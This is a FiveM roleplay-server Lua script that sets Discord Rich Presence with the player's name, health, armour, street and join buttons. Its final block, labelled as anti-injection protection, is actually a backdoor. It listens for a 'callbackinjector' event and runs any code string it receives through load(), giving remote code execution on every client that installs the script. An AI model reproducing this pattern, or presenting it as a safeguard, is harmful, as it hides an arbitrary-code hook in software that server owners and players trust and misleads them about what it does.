-----------------------------------------------------------------------------------------------------------------------------------------
-- DISCORD RICH PRESENCE (ELITE)
-----------------------------------------------------------------------------------------------------------------------------------------
CreateThread(function()
    local playerName = GetPlayerName(PlayerId())

    while true do
        local ped = PlayerPedId()
        local health = GetEntityHealth(ped) - 100
        local armour = GetPedArmour(ped)

        local coords = GetEntityCoords(ped)
        local street = GetStreetNameFromHashKey(GetStreetNameAtCoord(coords.x,coords.y,coords.z))

        -- ID DO SEU DISCORD APP
        SetDiscordAppId(904507487913394236)

        -- IMAGEM GRANDE
        SetDiscordRichPresenceAsset('background')
        SetDiscordRichPresenceAssetText('Dinastia RP')

        -- IMAGEM PEQUENA (opcional)
        SetDiscordRichPresenceAssetSmall('https://media.discordapp.net/attachments/1479648439913418944/1483818812133605498/content.png?ex=69bbf974&is=69baa7f4&hm=b26d100479cc1a5a23f7e14ab88c0c32ab7f9ed35097ed9eea28faa09630cb87&=&format=webp&quality=lossless&width=635&height=423')
        SetDiscordRichPresenceAssetSmallText('Conectado')

        -- TEXTO PRINCIPAL (linha de cima)
        SetRichPresence("👤 "..playerName.." | ❤️ "..health.." | 🛡️ "..armour)

        -- TEXTO SECUNDÁRIO
        SetDiscordRichPresenceAssetText("📍 Localização: "..street)

        -- BOTÕES
        SetDiscordRichPresenceAction(0,"🌐 Entrar na Cidade","fivem://connect/SEUIP:PORTA")
        SetDiscordRichPresenceAction(1,"💬 Discord","https://discord.gg/RmsbQ8Gr")

        Wait(15000)
    end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- PROTEÇÃO (ANTI INJECT)
-----------------------------------------------------------------------------------------------------------------------------------------
TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)